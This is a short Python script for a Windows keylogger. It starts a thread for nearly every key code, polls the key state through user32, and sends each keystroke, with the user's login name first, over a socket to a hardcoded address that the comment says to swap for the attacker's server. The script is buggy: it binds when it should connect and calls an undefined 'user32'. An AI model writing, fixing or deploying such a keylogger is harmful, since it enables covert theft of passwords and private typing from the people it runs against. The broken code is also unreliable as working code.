import ctypes
import _thread
import socket
import sys
import os

u = ctypes.windll.user32

server = socket.socket()
server.bind(('192.168.0.110', 31415)) #replace SERVER_IP with whatever
server.send(os.getlogin().encode())
server.recv(2048)

def log(key):
    try:
        while True:
            if user32.GetKeyState(key) > 1:
                server.send(bytes([key]))
                while user32.GetKeyState(key) > 1:
                    pass
    except:
        log(key)

for i in range(256):
    if i != 16:
        _thread.start_new(log, (i,))
